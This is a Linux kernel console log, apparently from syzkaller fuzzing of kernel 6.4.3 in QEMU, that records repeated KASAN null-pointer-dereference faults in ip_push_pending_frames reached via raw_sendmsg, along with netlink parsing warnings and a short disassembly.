RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000000af14000 CR4: 0000000000750ef0
PKRU: 55555554
netlink: 'syz-executor.6': attribute type 7 has an invalid length.
netlink: 'syz-executor.2': attribute type 11 has an invalid length.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#6] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 1 PID: 414862 Comm: syz-executor.7 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802cdbf7c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e908ec0 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88802cdbf2ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff88802ce27dc0 R14: ffff888001b28480 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030b9c000 CR4: 0000000000750ee0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f411ec49d2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f411dfba028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f411ed86f80 RCX: 00007f411ec49d2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007f411ecab4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007f411ed86f80 R15: 00007f411df9a000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030b9c000 CR4: 0000000000750ee0
PKRU: 55555554
netlink: 'syz-executor.2': attribute type 11 has an invalid length.
netlink: 'syz-executor.2': attribute type 11 has an invalid length.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#7] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 0 PID: 414939 Comm: syz-executor.7 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff888017ab77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff888030a63b00 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff888017ab72ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff888005164500 R14: ffff8880038c4900 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000015a24000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f411ec49d2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f411dfba028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f411ed86f80 RCX: 00007f411ec49d2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007f411ecab4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007f411ed86f80 R15: 00007f411df9a000
 </TASK>
Modules linked in:
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#8] PREEMPT SMP KASAN NOPTI
---[ end trace 0000000000000000 ]---
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
CPU: 1 PID: 414945 Comm: syz-executor.6 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff8880178d77c0 EFLAGS: 00010206
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206


RAX: dffffc0000000000 RBX: ffff88802ddbbb00 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff8880178d72ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff8880031a3b40 R14: ffff888001b2a880 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000021e6c000 CR4: 0000000000750ee0
PKRU: 55555554
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
Call Trace:
 <TASK>
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000015a24000 CR4: 0000000000750ef0
PKRU: 55555554
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb2a1b8bd2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb2a0efc028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb2a1cc8f80 RCX: 00007fb2a1b8bd2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb2a1bed4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb2a1cc8f80 R15: 00007fb2a0edc000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000021e6c000 CR4: 0000000000750ee0
PKRU: 55555554
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#9] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 0 PID: 414993 Comm: syz-executor.6 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff888015dcf7c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff888030bc3b00 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff888015dcf2ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff888030b81780 R14: ffff8880038c6d00 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030a26000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb2a1b8bd2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb2a0efc028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb2a1cc8f80 RCX: 00007fb2a1b8bd2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb2a1bed4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb2a1cc8f80 R15: 00007fb2a0edc000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030a26000 CR4: 0000000000750ef0
PKRU: 55555554
__nla_validate_parse: 61 callbacks suppressed
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.3'.
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.6'.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#10] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 1 PID: 415059 Comm: syz-executor.6 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff8880042477c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff888003169d80 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff8880042472ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff88802e108000 R14: ffff888001b2a400 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030a26000 CR4: 0000000000750ee0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb2a1b8bd2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb2a0efc028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb2a1cc8f80 RCX: 00007fb2a1b8bd2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb2a1bed4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb2a1cc8f80 R15: 00007fb2a0edc000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000030a26000 CR4: 0000000000750ee0
PKRU: 55555554
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.0'.
netlink: 88 bytes leftover after parsing attributes in process `syz-executor.4'.
netlink: 88 bytes leftover after parsing attributes in process `syz-executor.4'.
netlink: 'syz-executor.5': attribute type 2 has an invalid length.
netlink: 88 bytes leftover after parsing attributes in process `syz-executor.4'.
netlink: 'syz-executor.5': attribute type 2 has an invalid length.
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.6'.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#11] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 0 PID: 415105 Comm: syz-executor.6 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802d71f7c0 EFLAGS: 00010206
netlink: 274 bytes leftover after parsing attributes in process `syz-executor.1'.
RAX: dffffc0000000000 RBX: ffff888015e549c0 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88802d71f2ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff88802e88f500 R14: ffff8880038c5200 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000003220000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb2a1b8bd2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb2a0efc028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb2a1cc8f80 RCX: 00007fb2a1b8bd2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb2a1bed4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb2a1cc8f80 R15: 00007fb2a0edc000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb2a0efc640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 0000000003220000 CR4: 0000000000750ef0
PKRU: 55555554
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.6'.
netlink: 274 bytes leftover after parsing attributes in process `syz-executor.1'.
netlink: 'syz-executor.1': attribute type 3 has an invalid length.
netlink: 'syz-executor.1': attribute type 3 has an invalid length.
netlink: 'syz-executor.1': attribute type 3 has an invalid length.
netlink: 'syz-executor.2': attribute type 7 has an invalid length.
netlink: 'syz-executor.2': attribute type 7 has an invalid length.
netlink: 'syz-executor.1': attribute type 3 has an invalid length.
netlink: 'syz-executor.2': attribute type 7 has an invalid length.
netlink: 'syz-executor.3': attribute type 3 has an invalid length.
netlink: 'syz-executor.0': attribute type 1 has an invalid length.
----------------
Code disassembly (best guess):
   0:	c1 ea 03             	shr    $0x3,%edx
   3:	80 3c 02 00          	cmpb   $0x0,(%rdx,%rax,1)
   7:	0f 85 2f 01 00 00    	jne    0x13c
   d:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
  14:	fc ff df
  17:	49 8b 6d 58          	mov    0x58(%r13),%rbp
  1b:	48 83 e5 fe          	and    $0xfffffffffffffffe,%rbp
  1f:	48 8d 7d 30          	lea    0x30(%rbp),%rdi
  23:	48 89 fa             	mov    %rdi,%rdx
